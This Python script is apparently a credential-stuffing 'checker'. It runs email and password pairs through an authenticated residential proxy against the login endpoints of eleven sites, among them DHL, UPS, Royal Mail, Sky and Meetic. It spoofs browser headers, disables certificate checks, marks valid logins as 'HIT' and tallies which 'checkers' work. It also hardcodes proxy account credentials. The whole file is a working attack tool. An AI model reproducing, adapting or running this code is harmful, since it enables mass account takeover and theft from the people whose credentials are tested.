#!/usr/bin/env python3
"""Full test with residential proxy - test all 11 sites with 10 accounts"""
import requests
import warnings
import time
from colorama import init, Fore

warnings.filterwarnings("ignore")
init(autoreset=True)

print(f"{Fore.CYAN}{'='*70}")
print(f"{Fore.GREEN}{'FULL TEST - ALL 11 SITES WITH 10 ACCOUNTS'.center(70)}")
print(f"{Fore.CYAN}{'='*70}\n")

# Proxy: host:port:user:pass
PROXY_STR = "ngu.proxy.arealproxy.com:8080:652BthZDvxP7ozf:QDcj9tzf4gVaGNZ"
parts = PROXY_STR.split(":")
host, port, user, pwd = parts[0], parts[1], parts[2], parts[3]

proxy_url = f"http://{user}:{pwd}@{host}:{port}"
proxies = {"http": proxy_url, "https": proxy_url}

print(f"{Fore.YELLOW}Proxy: {host}:{port}")
print(f"{Fore.YELLOW}Testing connectivity...")

# Test proxy
try:
    r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=15)
    ip = r.json().get('origin', 'Unknown')
    print(f"{Fore.GREEN}✓ Proxy Working! IP: {ip}\n")
except Exception as e:
    print(f"{Fore.RED}✗ Proxy Error: {e}\n")
    exit()

# Test accounts
accounts = [
    ("test1@gmail.com", "Password123"),
    ("test2@yahoo.com", "MyPass456"),
    ("test3@outlook.com", "Secret789"),
    ("test4@hotmail.com", "Test1234"),
    ("test5@gmail.com", "Pass5678"),
    ("test6@yahoo.com", "Hello999"),
    ("test7@outlook.com", "World111"),
    ("test8@gmail.com", "Access222"),
    ("test9@hotmail.com", "Login333"),
    ("test10@yahoo.com", "Check444"),
]

ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

# Site configurations
sites = [
    {"name": "Azyrah", "url": "https://shop.azyrah.to/auth/signin", "type": "json", "fields": ("username", "password")},
    {"name": "Blstash", "url": "https://blstash.ws/login", "type": "form", "fields": ("username", "password")},
    {"name": "DHL", "url": "https://api-eu.dhl.com/auth/v1/token", "type": "json", "fields": ("username", "password")},
    {"name": "Easydeals", "url": "https://easydeals.gs/login", "type": "form", "fields": ("username", "password")},
    {"name": "Everymail", "url": "https://everymail.com/login", "type": "form", "fields": ("email", "password")},
    {"name": "Meetic", "url": "https://www.meetic.fr/api/authentication/login", "type": "json", "fields": ("email", "password")},
    {"name": "RoyalMail", "url": "https://www.royalmail.com/user/login", "type": "form", "fields": ("email", "password")},
    {"name": "Savastan0", "url": "https://savastan0.tools/login", "type": "form", "fields": ("username", "password")},
    {"name": "Sky", "url": "https://skyid.sky.com/api/authenticate", "type": "json", "fields": ("username", "password")},
    {"name": "Unitedshop", "url": "https://unitedshop.su/login", "type": "form", "fields": ("username", "password")},
    {"name": "UPS", "url": "https://www.ups.com/lasso/signin", "type": "form", "fields": ("userid", "password")},
]

results = {}

for site in sites:
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW}Testing: {site['name']} ({site['url'][:40]}...)")
    print(f"{Fore.CYAN}{'='*70}")
    
    site_results = {"success": 0, "invalid": 0, "error": 0}
    
    for i, (email, pwd) in enumerate(accounts, 1):
        try:
            s = requests.Session()
            headers = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            }
            
            # Build payload
            payload = {site['fields'][0]: email, site['fields'][1]: pwd}
            
            if site['type'] == 'json':
                headers["Content-Type"] = "application/json"
                headers["Accept"] = "application/json"
                r = s.post(site['url'], json=payload, headers=headers, proxies=proxies, timeout=15, verify=False)
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                r = s.post(site['url'], data=payload, headers=headers, proxies=proxies, timeout=15, verify=False, allow_redirects=True)
            
            status = r.status_code
            txt = r.text.lower()[:200]
            
            # Analyze response
            if status == 200:
                if any(x in txt for x in ["token", "success", "balance", "dashboard", "welcome", "logged", "session"]):
                    print(f"{Fore.GREEN}  [{i}] {email} | HIT - Valid Account!")
                    site_results["success"] += 1
                elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "fail", "denied", "unauthorized"]):
                    print(f"{Fore.RED}  [{i}] {email} | FAIL - Invalid credentials")
                    site_results["invalid"] += 1
                else:
                    print(f"{Fore.YELLOW}  [{i}] {email} | Status {status} - Response received")
                    site_results["success"] += 1
            elif status in [301, 302]:
                loc = r.headers.get('Location', '')[:30]
                if any(x in loc.lower() for x in ["dashboard", "account", "home"]):
                    print(f"{Fore.GREEN}  [{i}] {email} | HIT - Redirect to dashboard!")
                    site_results["success"] += 1
                else:
                    print(f"{Fore.YELLOW}  [{i}] {email} | Redirect: {loc}")
                    site_results["invalid"] += 1
            elif status == 401:
                print(f"{Fore.RED}  [{i}] {email} | FAIL - Unauthorized")
                site_results["invalid"] += 1
            elif status == 403:
                print(f"{Fore.RED}  [{i}] {email} | BLOCKED - Access denied")
                site_results["error"] += 1
            elif status == 404:
                print(f"{Fore.RED}  [{i}] {email} | ERROR - Endpoint not found")
                site_results["error"] += 1
            else:
                print(f"{Fore.YELLOW}  [{i}] {email} | Status: {status}")
                site_results["invalid"] += 1
                
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}  [{i}] {email} | TIMEOUT")
            site_results["error"] += 1
        except requests.exceptions.ProxyError:
            print(f"{Fore.RED}  [{i}] {email} | PROXY ERROR")
            site_results["error"] += 1
        except Exception as e:
            print(f"{Fore.RED}  [{i}] {email} | ERROR: {str(e)[:30]}")
            site_results["error"] += 1
        
        time.sleep(0.3)  # Small delay between requests
    
    # Site summary
    total = site_results["success"] + site_results["invalid"]
    if total > 0:
        status_str = f"{Fore.GREEN}WORKING"
    elif site_results["error"] == 10:
        status_str = f"{Fore.RED}BLOCKED/ERROR"
    else:
        status_str = f"{Fore.YELLOW}PARTIAL"
    
    print(f"\n  {Fore.CYAN}Result: {status_str} | Responses: {total}/10 | Errors: {site_results['error']}/10")
    results[site['name']] = site_results

# Final Summary
print(f"\n{Fore.CYAN}{'='*70}")
print(f"{Fore.GREEN}{'FINAL SUMMARY'.center(70)}")
print(f"{Fore.CYAN}{'='*70}\n")

working = 0
blocked = 0

for name, res in results.items():
    total_responses = res["success"] + res["invalid"]
    if total_responses >= 5:  # At least 5 responses = working
        color = Fore.GREEN
        symbol = "✓"
        status = "WORKING"
        working += 1
    elif total_responses > 0:
        color = Fore.YELLOW
        symbol = "⚠"
        status = "PARTIAL"
    else:
        color = Fore.RED
        symbol = "✗"
        status = "BLOCKED"
        blocked += 1
    
    print(f"{color}{symbol} {name:15} | {status:10} | Responses: {total_responses}/10 | Errors: {res['error']}/10")

print(f"\n{Fore.GREEN}Working Checkers: {working}/11")
print(f"{Fore.RED}Blocked/Errors: {blocked}/11")
